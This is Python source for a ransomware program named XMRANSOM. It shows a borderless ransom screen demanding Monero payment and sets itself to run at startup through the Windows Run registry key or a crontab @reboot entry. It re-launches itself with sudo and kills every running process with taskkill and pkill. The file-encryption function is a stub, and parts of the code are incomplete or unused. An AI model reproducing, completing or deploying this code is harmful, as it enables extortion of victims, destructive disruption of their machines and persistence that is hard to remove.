from tkinter import *
from screeninfo import get_monitors
import os
import winreg as reg
import ctypes
import sys

class RansomWindow(Frame):
      def __init__(self, master:Tk):
        super().__init__(master)
        self.pack()
        
        #? Set up geometry and sizing
        monitor = get_monitors()[0]
        screen_width = monitor.width
        screen_height = monitor.height
        
        size_x = round(screen_width * 0.80)
        size_y = round(screen_height * 0.80)
        
        offset_x = (screen_width - size_x) // 2
        offset_y = (screen_height - size_y) // 2
        
        master.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
        
        #? Set up looks
        master.overrideredirect(True)
        master.config(bg="#1E1E1E")
        
        # Display title
        title_label = Label(master, text="XMRANSOM", font=("Arial", 25, "bold"), bg="#1E1E1E", fg="white")
        title_label.pack(pady=10)
        
        # Display threatening paragraph
        paragraph_label = Label(master, text=get_labels().get("paragraph_label"), font=("Arial", 16), justify="center", bg="#1E1E1E", fg="white")
        paragraph_label.pack(pady=80)
        
        # Display how? button
        xmr_tutorial_button = Button(master,text="how?", command=lambda: open_tutorial_window(), width=40, height=3,font=("Arial", 12, "bold"), fg="#1E1E1E")
        xmr_tutorial_button.pack(pady=80)
        
        # Display very important donation address
        payout_label = Label(master, text=get_labels().get("XMR_Address"), font=("Arial", 12, "bold"), justify="center", wraplength=750, bg="#1E1E1E", fg="white")
        payout_label.pack(side="bottom", pady=10)
        
        #? Set up protocols
        #master.protocol("WM_DELETE_WINDOW",lambda: on_try_exit_ransomware(master))
        #master.attributes("-topmost", True)

#? Used to declutter the text spots, so it can read it from a text file instead
def get_labels():
    with open("labels.txt", 'r', encoding='utf-8') as file:
        ascii_art = {}
        current_label = None
        current_art = []

        for line in file:
            line = line.rstrip('\r\n')
            if line.startswith('---') and line.endswith('---'):
                if current_label and current_art:
                    ascii_art[current_label] = '\n'.join(current_art)
                    current_art = []
                current_label = line.replace('---', '').strip()
            else:
                current_art.append(line)

        # Append the last ASCII art piece
        if current_label and current_art:
            ascii_art[current_label] = '\n'.join(current_art)

    return ascii_art

#? Set up the tutorial window, to help people, send xmr to the address :D
def open_tutorial_window():
    tutorial_window = Tk()
    
    #? Set up sizing
    monitor = get_monitors()[0]
    screen_width = monitor.width
    screen_height = monitor.height
    
    size_x = round(screen_width * 0.40)
    size_y = round(screen_height * 0.30)
    
    offset_x = (screen_width - size_x) // 2
    offset_y = (screen_height - size_y) // 2
    
    tutorial_window.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
    
    tutorial_window.title("XMR Tutorial")
    tutorial_window.iconbitmap("./images/XMRansom_logo.ico")
    
    tutorial_label = Label(tutorial_window, text=get_labels().get("XMR_tutorial"), font=("Arial", 12, "bold"))
    tutorial_label.pack()
    
    tutorial_window.mainloop()

#? If the root window catches a close event it'll open the window again
def on_try_exit_ransomware(master:Tk):
    master.destroy()

    new_root = Tk()
    new_ransomWindow = RansomWindow(new_root)
    new_root.mainloop()

#? Starts out by checking if the ransomware already has registry keys, and admin
#? if it has, then exit
#? if it doesn't, then run the function, to gain admin, and save reg keys
def get_admin_and_startup():
    if os.name == "nt":
        #! Startup + admin priv for windows systems
        
        #? Set up keys and paths
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])
        reg_path = r"HKCU\{}".format(key)

        try:
            # Check if the registry key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, app_name)
            reg.CloseKey(reg_key)

            # Check if the RunAsAdmin key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
            reg.CloseKey(reg_key)

            print(f"{app_name} is already set to run on startup and as administrator.")
        except FileNotFoundError:
            try:
                # If the registry key doesn't exist, create it
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
                reg.CloseKey(reg_key)

                # Check if the application has admin privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(reg_key, f"{app_name}_RunAsAdmin", 0, reg.REG_SZ, "1")
                    reg.CloseKey(reg_key)

                    print(f"{app_name} has been set to run as administrator during startup.")
                else:
                    print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
            except Exception as e:
                print(f"Error occurred: {e}")
    else:
        #! Startup + sudo priv for unix systems
        
        #? Get the script added to startup
        script_path = os.path.abspath(sys.argv[0])
        # Add the script to the user's crontab to run at startup
        cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
        with open('/tmp/cron_job', 'w') as cron_file:
            cron_file.write(cron_command)
        subprocess.run(['crontab', '/tmp/cron_job'], check=True)
        os.remove('/tmp/cron_job')
        
        #? Make the script run with elevated privileges
        script_path = os.path.abspath(sys.argv[0])
        # Check if the script is already running with elevated privileges
        if os.geteuid() == 0:
            print("Already running with elevated privileges.")
        else:
            # Re-run the script using sudo to get elevated privileges
            sudo_command = f'sudo /usr/bin/python3 {script_path}'
            subprocess.run(sudo_command, shell=True, check=True)

#? Closes everything even the explorer.exe to remove core gui components, and to make the ransomware the only thing being open
def close_all():
    if os.name == "nt":
        # Kill all tasks currently open on the system in windows, -f [force] -t [kill all children, will make it impossible for it to restart] 
        # -im [image name] * [wildcard for all]
        os.system("taskkill -t -f -im *")
    else:
        # Kill all tasks currently open on the system in linux/macos, -9 pkill [force] -term [make it impossible for the task to restart]
        # -e [exact match] * [wilcard for all]
        os.system("pkill -9 -term -e *")

#? Encrypt all files on all available disks
def encrypt_all():
    print("Encrypting all")

#? Run in the beginning to set up the ransomware
def main():
    get_admin_and_startup()
    

root = Tk()
ransomWindow = RansomWindow(root)
root.mainloop()